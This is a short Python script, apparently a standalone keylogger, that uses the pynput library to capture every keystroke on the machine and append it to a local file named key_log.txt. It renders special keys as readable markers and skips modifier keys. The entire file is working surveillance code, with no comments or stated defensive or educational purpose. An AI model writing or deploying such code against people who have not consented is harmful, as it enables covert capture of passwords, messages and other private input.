from pynput import keyboard


IGNORE = {
    keyboard.Key.alt_l,
    keyboard.Key.ctrl_l,
    keyboard.Key.shift_l,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key):
    with open('key_log.txt', 'a', encoding='utf-8') as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key not in IGNORE:
                match key:
                    case keyboard.Key.space:
                        f.write(' ')
                    case keyboard.Key.tab:
                        f.write('\t')
                    case keyboard.Key.enter:
                        f.write('\n')
                    case keyboard.Key.backspace:
                        f.write(' ')
                    case keyboard.Key.esc:
                        f.write(' [ESC] ')
                    case _:
                        f.write(f'[{key}] ')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()